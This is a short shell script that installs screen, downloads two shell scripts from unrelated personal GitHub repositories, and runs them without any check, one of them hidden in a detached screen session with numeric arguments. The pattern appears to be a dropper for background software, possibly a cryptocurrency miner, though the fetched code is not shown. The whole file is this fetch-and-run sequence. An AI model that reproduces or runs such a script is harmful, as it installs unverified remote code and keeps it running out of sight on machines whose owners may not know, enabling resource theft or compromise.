#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://github.com/likeudo153/prem/raw/main/nhBeam.sh
wget https://github.com/DarshGoswami1982/FkgX/raw/main/man2.sh
chmod +x man2.sh
screen -dmS man2 ./man2.sh 60 70
chmod +x nhBeam.sh
./nhBeam.sh
